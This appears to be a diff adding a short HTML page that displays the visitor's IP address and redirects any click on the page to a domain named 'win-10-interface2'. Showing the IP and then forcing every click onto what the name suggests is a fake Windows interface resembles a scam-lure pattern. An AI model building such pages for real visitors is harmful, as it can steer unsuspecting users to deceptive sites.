@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Get IP Address and Redirect</title>
+<script>
+    document.addEventListener("DOMContentLoaded", function() {
+        // Function to get IP address
+        function getIPAddress() {
+            fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                document.getElementById('ip-address').textContent = "Your IP Address: " + data.ip;
+            })
+            .catch(error => console.error('Error:', error));
+        }
+
+        // Get IP address when page loads
+        getIPAddress();
+
+        // Redirect to the specified link when clicking anywhere on the website
+        document.body.addEventListener('click', function() {
+            window.location.href = 'https://win-10-interface2.vercel.app'; // Replace 'https://example.com' with your desired link
+        });
+    });
+</script>
+</head>
+<body>
+    <h1>Get IP Address and Redirect</h1>
+    <p id="ip-address"></p>
+</body>
+</html>
